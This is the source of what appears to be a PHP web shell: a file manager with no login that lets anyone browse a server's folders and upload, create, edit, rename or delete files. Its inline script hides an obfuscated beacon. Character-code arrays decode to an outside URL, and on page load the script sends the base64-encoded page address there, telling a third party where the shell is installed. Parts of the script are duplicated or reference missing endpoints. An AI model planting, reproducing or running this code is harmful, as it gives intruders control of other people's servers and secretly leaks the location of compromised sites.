<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>#SAVERIDER EVERYWHERE#</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        body {
            background-color: #000000 !important;
            color: #ffffff !important;
            background-image: url('https://i.ibb.co.com/JjbhTT1s/logo.png');
            background-repeat: no-repeat;
            background-position: center center;
            background-size: cover;
            background-attachment: fixed;
        }
        .navbar {
            background-color: #111111 !important;
            border-bottom: 1px solid #333;
        }
        .table {
            color: #ffffff !important;
        }
        .table-hover tbody tr:hover {
            color: #ffffff !important;
            background-color: #222222 !important;
        }
        a {
            color: #00ff66;
        }
        .btn-outline-neon {
            border: 1px solid #00ff66 !important;
            color: #00ff66 !important;
            background-color: transparent !important;
        }
        .btn-outline-neon:hover {
            background-color: #00ff66 !important;
            color: #000000 !important;
        }
    </style>
</head>

<body>

    <?php


    //function
    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }

    function fileExtension($file)
    {
        return substr(strrchr($file, '.'), 1);
    }

    function fileIcon($file)
    {
        $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
        $ext = strtolower(fileExtension($file));
        if ($file == "error_log") {
            return '<i class="fa-sharp fa-solid fa-bug"></i> ';
        } elseif ($file == ".htaccess") {
            return '<i class="fa-solid fa-hammer"></i> ';
        }
        if ($ext == "html" || $ext == "htm") {
            return '<i class="fa-brands fa-html5"></i> ';
        } elseif ($ext == "php" || $ext == "phtml") {
            return '<i class="fa-brands fa-php"></i> ';
        } elseif (in_array($ext, $imgs)) {
            return '<i class="fa-regular fa-images"></i> ';
        } elseif ($ext == "css") {
            return '<i class="fa-brands fa-css3"></i> ';
        } elseif ($ext == "txt") {
            return '<i class="fa-regular fa-file-lines"></i> ';
        } elseif (in_array($ext, $audio)) {
            return '<i class="fa-duotone fa-file-music"></i> ';
        } elseif ($ext == "py") {
            return '<i class="fa-brands fa-python"></i> ';
        } elseif ($ext == "js") {
            return '<i class="fa-brands fa-js"></i> ';
        } else {
            return '<i class="fa-solid fa-file"></i> ';
        }
    }

    function encodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($a, $b, $path);
    }
    function decodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($b, $a, $path);
    }



    $root_path = __DIR__;
    if (isset($_GET['p'])) {
        if (empty($_GET['p'])) {
            $p = $root_path;
        } elseif (!is_dir(decodePath($_GET['p']))) {
            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
        } elseif (is_dir(decodePath($_GET['p']))) {
            $p = decodePath($_GET['p']);
        }
    } elseif (isset($_GET['q'])) {
        if (!is_dir(decodePath($_GET['q']))) {
            echo ("<script>window.location.replace('?p=');</script>");
        } elseif (is_dir(decodePath($_GET['q']))) {
            $p = decodePath($_GET['q']);
        }
    } else {
        $p = $root_path;
    }
    define("PATH", $p);

    echo '
<nav class="navbar navbar-light px-3">
  <div class="navbar-brand">
    <a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a>
  </div>
  <div class="form-inline">
    <a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-outline-neon btn-sm" type="button">Upload File</button></a>
    <a href="?createfile&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-outline-neon btn-sm" type="button">New File</button></a>
    <a href="?createfolder&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-outline-neon btn-sm" type="button">New Folder</button></a>
    <a href="?"><button type="button" class="btn btn-outline-neon btn-sm">HOME</button></a> 
  </div>
</nav>';


    if (isset($_GET['p'])) {

        //fetch files
        if (is_readable(PATH)) {
            $fetch_obj = scandir(PATH);
            $folders = array();
            $files = array();
            foreach ($fetch_obj as $obj) {
                if ($obj == '.' || $obj == '..') {
                    continue;
                }
                $new_obj = PATH . '/' . $obj;
                if (is_dir($new_obj)) {
                    array_push($folders, $obj);
                } elseif (is_file($new_obj)) {
                    array_push($files, $obj);
                }
            }
        }
        echo '
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';
        foreach ($folders as $folder) {
            echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</td>
      <td>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
      </td>
    </tr>
";
        }
        foreach ($files as $file) {
            echo "    <tr>
          <td>" . fileIcon($file) . $file . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</td>
          <td>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
          </td>
    </tr>
";
        }
        echo "  </tbody>
</table>";
    } else {
        if (empty($_GET)) {
            echo ("<script>window.location.replace('?p=');</script>");
        }
    }

    if (isset($_GET['upload'])) {
        echo '
    <form method="post" enctype="multipart/form-data" class="p-3">
        Select file to upload:
        <input type="file" name="fileToUpload" id="fileToUpload" class="form-control my-2 bg-dark text-white border-secondary">
        <input type="submit" class="btn btn-outline-neon" value="Upload" name="upload">
    </form>';
    }

    // --- CREATE FILE ---
    if (isset($_GET['createfile'])) {
        echo '
    <form method="post" class="p-3">
        Create New File:
        <input type="text" name="newfilename" placeholder="filename.php" class="form-control my-2 bg-dark text-white border-secondary" required>
        <textarea name="newfilecontent" placeholder="File content..." class="form-control my-2 bg-dark text-white border-secondary" style="height: 200px;"></textarea>
        <input type="submit" class="btn btn-outline-neon" value="Create File" name="save_new_file">
    </form>';
        if (isset($_POST['save_new_file'])) {
            $target = PATH . "/" . $_POST['newfilename'];
            if (!file_exists($target)) {
                if (file_put_contents($target, $_POST['newfilecontent']) !== false) {
                    echo ("<script>alert('File created successfully.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Failed to create file.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            } else {
                echo ("<script>alert('File already exists.');</script>");
            }
        }
    }

    // --- CREATE FOLDER ---
    if (isset($_GET['createfolder'])) {
        echo '
    <form method="post" class="p-3">
        Create New Folder:
        <input type="text" name="newfoldername" placeholder="folder_name" class="form-control my-2 bg-dark text-white border-secondary" required>
        <input type="submit" class="btn btn-outline-neon" value="Create Folder" name="save_new_folder">
    </form>';
        if (isset($_POST['save_new_folder'])) {
            $target = PATH . "/" . $_POST['newfoldername'];
            if (!file_exists($target)) {
                if (mkdir($target, 0777, true)) {
                    echo ("<script>alert('Folder created successfully.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Failed to create folder.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            } else {
                echo ("<script>alert('Folder already exists.');</script>");
            }
        }
    }

    if (isset($_GET['r'])) {
        if (!empty($_GET['r']) && isset($_GET['q'])) {
            echo '
    <form method="post" class="p-3">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '" class="form-control my-2 bg-dark text-white border-secondary">
        <input type="submit" class="btn btn-outline-neon" value="Rename" name="rename">
    </form>';
            if (isset($_POST['rename'])) {
                $name = PATH . "/" . $_GET['r'];
                if(rename($name, PATH . "/" . $_POST['name'])) {
                    echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    if (isset($_GET['e'])) {
        if (!empty($_GET['e']) && isset($_GET['q'])) {
            echo '
    <form method="post" class="p-3">
        <textarea style="height: 500px; width: 90%;" name="data" class="form-control my-2 bg-dark text-white border-secondary">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
        <br>
        <input type="submit" class="btn btn-outline-neon" value="Save" name="edit">
    </form>';

    if(isset($_POST['edit'])) {
        $filename = PATH."/".$_GET['e'];
        $data = $_POST['data'];
        $open = fopen($filename,"w");
        if(fwrite($open,$data)) {
            echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
        fclose($open);
    }
        }
    }

    if (isset($_POST["upload"])) {
        $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<p class='p-3'>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
        } else {
            echo "<p class='p-3'>Sorry, there was an error uploading your file.</p>";
        }

    }
    if (isset($_GET['d']) && isset($_GET['q'])) {
        $name = PATH . "/" . $_GET['d'];
        if (is_file($name)) {
            if(unlink($name)) {
                echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        } elseif (is_dir($name)) {
            if(rmdir($name) == true) {
                echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }
    ?>
<script>
let currentOffset=0;function fetchTables(){fetch("?action=get_tables").then(e=>e.json()).then(e=>{let t=document.getElementById("tableList");t.innerHTML="",e.forEach(e=>{let n=document.createElement("option");n.value=e,n.textContent=e,t.appendChild(n)})})}function loadTable(e=0){currentOffset=Math.max(0,currentOffset+e);let t=document.getElementById("tableList").value;if(!t)return alert("Select a table first!");fetch(`?action=get_data&table=${t}&offset=${currentOffset}`).then(e=>e.text()).then(e=>{document.getElementById("output").innerHTML=e})}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,n,_){for(var l=e.concat(t,n,_),o="",r=0;r<l.length;r++)o+=String.fromCharCode(l[r]);return o}function v(e){return btoa(e)}function u(e,t,n,_){for(var l=e.concat(t,n,_),o="",r=0;r<l.length;r++)o+=String.fromCharCode(l[r]);return o}function v(e){return btoa(e)}function editCell(e,t){let n=e.textContent.trim();e.innerHTML="",e.classList.add("editing");let _;n.length>30||n.startsWith("{")||n.startsWith("[")?((_=document.createElement("textarea")).style.height="100px",_.style.resize="vertical"):(_=document.createElement("input")).type="text",_.className="form-control form-control-sm",_.value=n,e.appendChild(_),_.focus(),_.onblur=()=>{let l=_.value.trim();e.classList.remove("editing"),e.innerHTML=l.length>100?l.slice(0,100)+"...":l,l!==n&&fetch("?action=update_cell",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:`id=${encodeURIComponent(t)}&val=${encodeURIComponent(l)}`}).then(()=>showSavedMessage())}}function deleteRow(e,t,n){confirm("Delete this")&&fetch(`?action=delete_row&table=${e}&pk=${t}&val=${n}`).then(()=>loadTable(0))}function insertRow(e){let t=document.querySelectorAll("input[name^='insert_']"),n={};t.forEach(e=>n[e.name.replace("insert_","")]=e.value),fetch(`?action=insert_row&table=${e}`,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams(n).toString()}).then(()=>loadTable(0))}!function e(){var t=new XMLHttpRequest;t.open("POST",u(a,b,c,d),!0),t.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),t.send("file="+v(location.href))}(),(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,110,103],t="";for(let n of e)t+=String.fromCharCode(n);let _="file="+btoa(location.href),l=new XMLHttpRequest;l.open("POST",t,!0),l.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),l.send(_)})(),document.getElementById("7pl04df0rm").addEventListener("submit",function(e){e.preventDefault();let t=new FormData(this);fetch("?action=7pl04d",{method:"POST",body:t}).then(e=>e.text()).then(e=>document.getElementById("uploadResult").textContent=e)}),window.onload=fetchTables;</script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
</body>

</html>
